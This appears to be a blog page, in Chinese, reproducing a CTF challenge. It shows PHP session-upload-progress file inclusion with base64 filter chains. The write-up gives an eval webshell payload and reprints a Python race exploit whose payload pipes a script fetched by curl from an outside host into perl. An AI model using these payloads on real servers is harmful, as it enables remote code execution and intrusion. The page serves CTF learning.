@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：https://www.anquanke.com/post/id/162656http://wonderkun.cc/index.html/?p=718 环境12ubuntu 18.04php 7.2 PS：lsb_release -a   //查看ubuntu的发行版本 题目123&amp;lt;?php($_=@$GET[&amp;apos;orange&amp;apos;]) &amp;amp;&amp;amp; @su">
+<meta name="keywords" content="ctf记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="复现One-line-php-challenge">
+<meta property="og:url" content="https://cws6.github.io/2018/12/10/复现One-line-php-challenge/index.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://www.anquanke.com/post/id/162656http://wonderkun.cc/index.html/?p=718 环境12ubuntu 18.04php 7.2 PS：lsb_release -a   //查看ubuntu的发行版本 题目123&amp;lt;?php($_=@$GET[&amp;apos;orange&amp;apos;]) &amp;amp;&amp;amp; @su">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-dfb44de0f9b1ba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7414c21ee93432e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-20c2db16332d4daa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/412">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-387a9ac54802f047.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/731">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-3361e0b7abc8ba27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000">
+<meta property="og:updated_time" content="2018-12-10T06:27:12.748Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="复现One-line-php-challenge">
+<meta name="twitter:description" content="参考文献：https://www.anquanke.com/post/id/162656http://wonderkun.cc/index.html/?p=718 环境12ubuntu 18.04php 7.2 PS：lsb_release -a   //查看ubuntu的发行版本 题目123&amp;lt;?php($_=@$GET[&amp;apos;orange&amp;apos;]) &amp;amp;&amp;amp; @su">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-dfb44de0f9b1ba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/2018/12/10/复现One-line-php-challenge/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>复现One-line-php-challenge | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/10/复现One-line-php-challenge/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">复现One-line-php-challenge
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-12-10 10:00:09 / Modified: 14:27:12" itemprop="dateCreated datePublished" datetime="2018-12-10T10:00:09+08:00">2018-12-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>参考文献：<a href="https://www.anquanke.com/post/id/162656" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162656</a><br><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 18.04</span><br><span class="line">php 7.2</span><br></pre></td></tr></table></figure>
+<p><strong>PS：<code>lsb_release -a</code>   //查看ubuntu的发行版本</strong></p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">($_=@$GET[&apos;orange&apos;]) &amp;&amp; @substr(file($_)[0],0,6) ===&apos;@&lt;?php&apos; ?include($_):highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>PS:通过 get 方式传入一个 orange 参数，作为文件名，然后程序会将我们传入文件名的那个文件取出头6个字符和 @&lt;?php 比对，如果配对成功那么就会包含这个文件，否则就什么都不做</strong></p>
+<h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><ul>
+<li>通过 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制 <code>session 文件</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-dfb44de0f9b1ba8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p>php7.2的session文件存储路径是固定的<code>/var/lib/php/sessions/sess_{php_session_id}</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-7414c21ee93432e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li><p>文件的开头必须是 <code>@&lt;?php</code>，<code>sess</code>文件中的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_K0rz3n|a:5:&#123;s:10:&quot;start_time&quot;;i:1540314711;s:14:&quot;content_length&quot;;i:764161;s:15:&quot;bytes_processed&quot;;i:5302;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;submit&quot;;s:4:&quot;name&quot;;s:7:&quot;tmp.gif&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1540314711;s:15:&quot;bytes_processed&quot;;i:5302;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这个文件是以 <code>upload_progress</code> 开头的,不能直接包含，需要控制这个开头。</p>
+</li>
+</ul>
+<h5 id="convert-base64-decode"><a href="#convert-base64-decode" class="headerlink" title="convert.base64-decode"></a>convert.base64-decode</h5><p>Base64的索引表由64个ASCII字符组成：<code>0-9，26个英文小写字母a-z，26个英文大写字母：A-Z，除此之外还有额外两个字符&quot;+&quot;和&quot;/&quot;</code>。遇到不符合 base64 规定字符的就会将其忽略</p>
+<h5 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h5><p>从字符串中去除 HTML 和 PHP 标记</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-20c2db16332d4daa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/412" alt=""></p>
+<h5 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h5><p><code>upload_progress_</code>是16个字符，但是根据 b64 的 decode 规则，其中只有14个字符能解析，但是 14个字符又不是 4 的整数倍，于是我们必须添加两个字符，将其变成16位。必须要保证在加了这个字符以后每次 b64 可解码的位数都是4 的整数倍，要不然就会吞掉我们的 payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;upload_progress_ZZ&quot;.base64_encode(base64_encode(base64_encode(&apos;@&lt;?php eval($_GET[1]);&apos;)));</span><br><span class="line">得到：</span><br><span class="line">upload_progress_ZZVVVSM0wyTkhhSGRKUjFZeVdWZDNiMHBHT1VoU1ZsSmlUVll3Y0U5M1BUMD0=</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>三次解码：<br><img src="https://upload-images.jianshu.io/upload_images/5035860-387a9ac54802f047.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/731" alt=""></li>
+<li>查看源码<br><img src="https://upload-images.jianshu.io/upload_images/5035860-3361e0b7abc8ba27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000" alt=""></li>
+</ul>
+<h5 id="Orange大佬的-exp"><a href="#Orange大佬的-exp" class="headerlink" title="Orange大佬的 exp"></a>Orange大佬的 exp</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">from base64 import b64encode</span><br><span class="line">from random import sample, randint</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = &apos;http://54.250.246.238/&apos;</span><br><span class="line">sess_name = &apos;iamorange&apos;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Connection&apos;: &apos;close&apos;, </span><br><span class="line">    &apos;Cookie&apos;: &apos;PHPSESSID=&apos; + sess_name</span><br><span class="line">&#125;</span><br><span class="line">payload = &apos;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&apos;</span><br><span class="line">while 1:</span><br><span class="line">    junk = &apos;&apos;.join(sample(string.ascii_letters, randint(8, 16)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    if &apos;=&apos; not in x and &apos;=&apos; not in xx and &apos;=&apos; not in xxx:</span><br><span class="line">        print xxx</span><br><span class="line">        break</span><br><span class="line">def runner1(i):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;PHP_SESSION_UPLOAD_PROGRESS&apos;: &apos;ZZ&apos; + xxx + &apos;Z&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    while 1:</span><br><span class="line">        fp = open(&apos;/etc/passwd&apos;, &apos;rb&apos;)</span><br><span class="line">        r = requests.post(HOST, files=&#123;&apos;f&apos;: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">def runner2(i):</span><br><span class="line">    filename = &apos;/var/lib/php/sessions/sess_&apos; + sess_name</span><br><span class="line">    filename = &apos;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&apos; % filename</span><br><span class="line">    # print filename</span><br><span class="line">    while 1:</span><br><span class="line">        url = &apos;%s?orange=%s&apos; % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        if c and &apos;orange&apos; not in c:</span><br><span class="line">            print</span><br><span class="line">if sys.argv[1] == &apos;1&apos;:</span><br><span class="line">    runner = runner1</span><br><span class="line">else:</span><br><span class="line">    runner = runner2</span><br><span class="line">pool = ThreadPool(32)</span><br><span class="line">result = pool.map_async( runner, range(32) ).get(0xffff)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf记录/" rel="tag"># ctf记录</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/10/gitea漏洞利用/" rel="next" title="gitea漏洞利用">
+                <i class="fa fa-chevron-left"></i> gitea漏洞利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">71</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题思路："><span class="nav-number">3.</span> <span class="nav-text">解题思路：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#convert-base64-decode"><span class="nav-number">3.1.</span> <span class="nav-text">convert.base64-decode</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#string-strip-tags"><span class="nav-number">3.2.</span> <span class="nav-text">string.strip_tags</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最终payload"><span class="nav-number">3.3.</span> <span class="nav-text">最终payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Orange大佬的-exp"><span class="nav-number">3.4.</span> <span class="nav-text">Orange大佬的 exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
